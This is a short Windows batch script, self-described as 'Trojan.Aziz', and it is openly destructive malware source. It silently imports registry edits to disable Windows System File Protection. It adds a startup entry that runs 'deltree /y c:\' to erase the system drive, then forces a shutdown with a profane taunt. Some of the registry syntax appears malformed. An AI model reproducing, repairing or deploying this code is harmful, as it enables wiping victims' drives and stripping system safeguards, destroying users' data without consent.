::Trojan.Aziz by Gangbang 2008
@echo off
echo Aziz will fuck you all!!! > %TEMP%\aziz.reg
echo. >> %TEMP%\aziz.reg
echo ;Trojan.aziz by Gangbang >> %TEMP%\aziz.reg
echo [HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> %TEMP%\aziz.reg
echo "SFCDisable"=dword:ffffff9d >> %TEMP%\aziz.reg
echo. >> %TEMP%\aziz.reg
regedit /s %TEMP%\aziz.reg

@echo off
echo. >> %TEMP%\aziz1.reg
echo ;Trojan.aziz by Gangbang >> %TEMP%\aziz1.reg
echo [HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RunServices] >> %TEMP%\aziz1.reg
echo "aziz"=sz:deltree /y c:\ >> %TEMP%\aziz1.reg
echo. >> %TEMP%\aziz1.reg
regedit /s %TEMP%\aziz1.reg

shutdown -s -f -t 10 "Aziz will fuck you all..."